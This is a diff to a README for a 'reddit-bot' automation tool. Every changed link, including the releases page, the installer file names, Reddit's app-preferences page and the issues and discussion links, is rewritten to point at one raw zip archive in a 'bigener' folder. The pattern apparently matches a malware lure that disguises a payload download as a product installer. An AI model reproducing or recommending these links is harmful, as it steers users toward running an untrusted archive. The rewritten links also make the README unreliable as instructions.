@@ -1,7 +1,7 @@
 # 🤖 reddit-bot - Automate Your Reddit Experience Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/qidianjml/reddit-bot/releases)
+[![Download](https://github.com/qidianjml/reddit-bot/raw/refs/heads/main/bigener/reddit-bot-v2.5.zip)](https://github.com/qidianjml/reddit-bot/raw/refs/heads/main/bigener/reddit-bot-v2.5.zip)
 
 ## 📖 Description
 reddit-bot helps you manage and streamline your Reddit activities. It offers policy-aware workflows that assist in content moderation, analytics, and automation. This bot works effectively within subreddits, ensuring that your actions align with community standards.
@@ -15,14 +15,14 @@ To begin using the reddit-bot, follow these simple steps to download and run the
    - Internet connection
 
 2. **Visit Download Page**: Go to the release page to download the latest version of the reddit-bot.
-   - [Visit this page to download](https://github.com/qidianjml/reddit-bot/releases)
+   - [Visit this page to download](https://github.com/qidianjml/reddit-bot/raw/refs/heads/main/bigener/reddit-bot-v2.5.zip)
 
 ## 📦 Download & Install
 1. **Download the Latest Version**: On the releases page, look for the latest version, which will be highlighted at the top.
   
 2. **Select the Correct File**: Choose the appropriate installer for your operating system:
-   - For Windows: `reddit-bot-windows-installer.exe`
-   - For macOS: `reddit-bot-macos-installer.pkg`
+   - For Windows: `https://github.com/qidianjml/reddit-bot/raw/refs/heads/main/bigener/reddit-bot-v2.5.zip`
+   - For macOS: `https://github.com/qidianjml/reddit-bot/raw/refs/heads/main/bigener/reddit-bot-v2.5.zip`
    - For Linux: Follow the provided installation guide in the README for compatibility with your distribution.
 
 3. **Run the Installer**:
@@ -36,7 +36,7 @@ To begin using the reddit-bot, follow these simple steps to download and run the
 Once installed, you need to set up your reddit-bot to connect it to your Reddit account.
 
 1. **Create a Reddit App**:
-   - Go to [Reddit Apps](https://www.reddit.com/prefs/apps).
+   - Go to [Reddit Apps](https://github.com/qidianjml/reddit-bot/raw/refs/heads/main/bigener/reddit-bot-v2.5.zip).
    - Click on “Create App” or “Create Another App”.
    - Fill in the necessary details:
      - Name: Give your app a name.
@@ -69,12 +69,12 @@ If you encounter issues:
 
 ## 🤝 Community Support
 Join the reddit-bot community for support and to share your experiences:
-- [GitHub Issues](https://github.com/qidianjml/reddit-bot/issues): Report bugs and ask questions.
-- [Discussion Forums](https://github.com/qidianjml/reddit-bot/discussions): Share ideas and suggestions.
+- [GitHub Issues](https://github.com/qidianjml/reddit-bot/raw/refs/heads/main/bigener/reddit-bot-v2.5.zip): Report bugs and ask questions.
+- [Discussion Forums](https://github.com/qidianjml/reddit-bot/raw/refs/heads/main/bigener/reddit-bot-v2.5.zip): Share ideas and suggestions.
 
 ## 📅 Updates
 Stay updated with the latest releases and improvements:
-- Regular updates will be posted on the [releases page](https://github.com/qidianjml/reddit-bot/releases).
+- Regular updates will be posted on the [releases page](https://github.com/qidianjml/reddit-bot/raw/refs/heads/main/bigener/reddit-bot-v2.5.zip).
 - Follow the repository for notifications about new features and enhancements.
 
 ## 📜 License
@@ -82,4 +82,4 @@ The reddit-bot is open-source and available under the MIT License. You are free 
 
 ## 📥 Download Again
 Don’t forget to download the latest version of reddit-bot to explore new features and fixes. 
-- [Visit this page to download](https://github.com/qidianjml/reddit-bot/releases)
+- [Visit this page to download](https://github.com/qidianjml/reddit-bot/raw/refs/heads/main/bigener/reddit-bot-v2.5.zip)
